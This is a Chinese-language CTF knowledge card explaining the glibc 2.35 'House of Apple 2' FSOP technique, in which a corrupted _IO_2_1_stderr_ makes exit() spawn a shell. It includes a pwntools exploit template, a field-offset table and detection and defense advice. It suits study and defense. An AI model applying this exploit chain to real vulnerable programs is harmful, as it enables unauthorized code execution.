---
id: binary-pwn-heap-house-of-apple-2-stderr-fsop
title: House of Apple 2 覆盖 _IO_2_1_stderr_ 从 exit 触发 FSOP 拿 shell
type: scenario
domain: binary
path: binary/pwn/heap
technique: house-of-apple-2-fsop
aliases:
- House of Apple 2
- 苹果屋2
- stderr FSOP
- _IO_wfile_jumps
- _wide_vtable 劫持
- exit 触发 FSOP
tags:
- pwn
- heap
- glibc
- fsop
- io-file
- tcache
- wide-data
- rop
cve: []
severity: high
confidence: high
affected_versions: glibc 2.35（实测 2.35-0ubuntu3.8）
status: verified
created: '2026-11-04'
updated: '2026-11-04'
verification:
  verified_by: verifier-E
  verified_at: '2026-11-04T19:16:02+08:00'
  notes: 已对照原文核对：_IO_flush_all_lockp 窄分支条件、_IO_wfile_overflow→_IO_wdoallocbuf→wide_vtable+0x68 调用链、stderr 字段偏移与图 06/07 断点回溯一致；PoC 未在本机执行，偏移需按目标 libc 复核。
---

## 一句话结论

在 glibc 2.35 的 UAF/任意分配场景里，把 tcache 链毒到 `_IO_2_1_stderr_` 并用伪造的 `_IO_FILE` 覆盖它，主 vtable 填合法的 `_IO_wfile_jumps` 绕过 `IO_validate_vtable`，再让 `_wide_data->_wide_vtable` 指向堆上伪造跳表；程序从 `exit()` 进入 `_IO_flush_all_lockp` 时会走到 `_IO_wdoallocbuf`，以 fake FILE 地址（同时是 `" sh"` 命令串）为参数调用 `system`，从而拿 shell。

## 原理

- Full RELRO + PIE 时 GOT 改写不可用，但 `exit()` 会走 `_IO_cleanup → _IO_flush_all_lockp`，遍历 `_IO_list_all` 链表。`_IO_2_1_stderr_` 位于该链链头，且菜单程序通常不碰 stderr，适合作为覆盖目标。
- `_IO_flush_all_lockp`（2.35）对每个 FILE 判断是否 flush：`fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base`，或宽字符分支。把 `_mode` 置 0、`_IO_write_base=0`、`_IO_write_ptr=1` 即满足窄分支。
- 主 vtable 设为 `_IO_wfile_jumps` 后，`_IO_OVERFLOW(fp, EOF)` 进入 `_IO_wfile_overflow`。该函数检查 `_flags & _IO_NO_WRITES (0x8)`；当 `_wide_data->_IO_write_base == NULL` 时调用 `_IO_wdoallocbuf(fp)`。
- `_IO_wdoallocbuf` 在 `_wide_data->_IO_buf_base == NULL` 且 `_flags & _IO_UNBUFFERED (0x2) == 0` 时，执行 `*(_wide_data->_wide_vtable + 0x68)(fp)`，即 `__doallocate` 槽位。关键点：`IO_validate_vtable` 只校验主 `vtable` 是否落在 `__libc_IO_vtables` 段内，`_wide_data->_wide_vtable` 是校验盲区，可以指向堆。
- 把 `_wide_vtable + 0x68` 写成 `system`，`fp` 作为第一个参数传入。`_flags` 字段放 `" sh\0"`（0x00687320）：既避开 `_IO_NO_WRITES(0x8)`、`_IO_UNBUFFERED(0x2)`、`_IO_CURRENTLY_PUTTING(0x800)`，又让 `system(" sh")` 等价于 `system("sh")`。
- 选 stderr 而非 stdout：stdout 会被菜单的 `printf`/`memset` 反复触碰，覆盖后可能在走到 `exit()` 前就崩；stderr 无缓冲且菜单不使用，覆盖后程序能正常跑到退出路径。

## 触发条件

- glibc 2.35 目标（实测 2.35-0ubuntu3.8）；其他版本需重新确认 `_IO_FILE` / `_IO_wide_data` / vtable 偏移。
- 已有任意分配或 tcache poisoning 能力，能把一次 `malloc(0xe0)` 返回到 `_IO_2_1_stderr_`。
- 已知 libc 基址（`_IO_2_1_stderr_`、`_IO_wfile_jumps`、`system` 的偏移）与堆地址（用于构造 fake `_wide_data` 和 `_wide_vtable`，并计算 safe-linking 密钥）。
- 程序最终通过 `exit()` 或 `main` 返回退出；stderr 在覆盖后不被其他流程消费。
- UAF `edit` 能写 free chunk 的 `fd`（tcache 毒化入口）。

## 利用步骤

1. 用 unsorted bin 泄露 libc 基址（见关联卡），解析 `system`、`_IO_2_1_stderr_`、`_IO_wfile_jumps`。
2. 用 safe-linking 自异或恢复堆地址（见关联卡），得到可写堆块与 tcache 密钥。
3. 毒化 tcache：把某个 0xe0 chunk 的 `fd` 改成 `PROTECT_PTR(&chunk->fd, &_IO_2_1_stderr_)`；连续两次 `malloc(0xe0)`，第二次返回 `_IO_2_1_stderr_`。
4. 通过 Add 的读入覆盖 `_IO_2_1_stderr_` 的前 0xe0 字节，按目标版本布局填 fake FILE（见 PoC 表）。
5. 在堆上布置 fake `_wide_data`：`_IO_write_base` 保持 NULL，`_wide_vtable` 指向 fake jump table；在 fake jump table + 0x68 写入 `system`。
6. 选择 Exit 菜单，触发 `puts("Bye")` → `main` 返回 → `exit()` → `_IO_cleanup` → `_IO_flush_all_lockp` → `_IO_wfile_overflow` → `_IO_wdoallocbuf` → `system(" sh")`。

## PoC

```python
from pwn import *

# 已获得：libc_base、heap_base/chunk_addr、safe-linking 密钥
stderr_fp   = libc_base + STDER_OFF          # _IO_2_1_stderr_
wfile_jumps = libc_base + WFILE_JUMPS_OFF    # _IO_wfile_jumps
system_addr = libc_base + SYSTEM_OFF

fake_wd     = heap_base + WD_OFF             # 可写堆块，_wide_data
fake_vtable = fake_wd + 0x100

# 1) 先构造 fake FILE 布局（glibc 2.35，偏移以目标 libc 为准）
payload = flat({
    0x00: b" sh\0",          # _flags：命令串，且避开 0x2/0x8/0x800
    0x20: 0,                 # _IO_write_base
    0x28: 1,                 # _IO_write_ptr > _IO_write_base
    0x88: zero_heap_addr,    # _lock：指向可写全零区域
    0xA0: fake_wd,           # _wide_data
    0xC0: 0,                 # _mode = 0，走窄分支
    0xD8: wfile_jumps,       # 合法主 vtable，过 IO_validate_vtable
}, length=0xe0)

# 2) 毒化 tcache 到 stderr，第二次 malloc(0xe0) 返回 stderr
key = (chunk_addr + 0x10) >> 12
edit(chunk_idx, p64(key ^ stderr_fp))
add(0xe0, b'A')          # 第一次：原 chunk
add(0xe0, payload)       # 第二次：_IO_2_1_stderr_

# 3) fake _wide_data / _wide_vtable
#    _IO_write_base 必须为 NULL，才会进入 _IO_wdoallocbuf
write(fake_wd + 0x18, p64(0))       # _IO_write_base = NULL
write(fake_wd + 0xe0, p64(fake_vtable))
write(fake_vtable + 0x68, p64(system_addr))  # __doallocate 槽位

# 4) 退出，触发 exit() 的 FSOP
io.sendlineafter(b'> ', b'5')
io.interactive()
```

| 偏移（`_IO_FILE`） | 字段 | 值 | 作用 |
| --- | --- | --- | --- |
| 0x00 | `_flags` | `" sh\0"` | 同时作命令串并绕过三道 flags 闸 |
| 0x20 | `_IO_write_base` | 0 | flush 条件 |
| 0x28 | `_IO_write_ptr` | 1 | flush 条件 |
| 0x88 | `_lock` | 堆上全零可写区 | `_IO_flockfile` 的 CAS 可写 |
| 0xA0 | `_wide_data` | fake_wd | 指向伪造宽结构 |
| 0xC0 | `_mode` | 0 | 走窄字符 flush 分支 |
| 0xD8 | `vtable` | `_IO_wfile_jumps` | 通过主 vtable 合法性校验 |

## 变体与关联

- 关联卡：[[binary-pwn-heap-uaf-unsorted-bin-libc-leak]]（先泄 libc）；[[binary-pwn-heap-safe-linking-self-xor-heap-address]]（恢复堆地址并计算毒化密钥）。
- 目标变体：官方解常用 large bin attack 改写 `_IO_list_all` 指向堆上的 fake FILE；本链直接覆盖 `_IO_2_1_stderr_` 本体，少一次 large bin 铺垫。也可改打 `_IO_2_1_stdout_`/`_IO_2_1_stdin_`，但要处理菜单对 stdout 的触碰。
- 版本变体：不同 glibc 的 `_IO_wide_data` 布局、`_wide_vtable` 偏移、`_IO_wfile_jumps` 偏移不同；2.35 之后对 FSOP 的校验持续收紧，需按目标 libc 重新确认。
- 相关技巧：House of Apple 1/3、House of Kiwi、`_IO_str_jumps` 等 FSOP 家族；核心都是找“合法 vtable + 未校验的间接调用槽”。

## 检测与防御

- 检测：进程退出阶段在 `_IO_flush_all_lockp`/`_IO_wfile_overflow`/`_IO_wdoallocbuf` 出现异常调用栈；`_IO_2_1_stderr_` 等 libc FILE 结构被改写（`_flags` 出现可打印命令串、vtable 异常）；tcache `fd` 指向 libc 数据段。
- 防御：修复 UAF 根因（free 后置空、生命周期管理）；升级 glibc 并跟进 FSOP 校验加固；对 tcache/fastbin 元数据做完整性校验；Full RELRO/PIE/Canary 不能阻止 FSOP，不能替代堆安全。
- 认知：`IO_validate_vtable` 只覆盖主 vtable，`_wide_data->_wide_vtable` 是设计上的校验盲区；只校验一个指针不足以封死 FSOP。
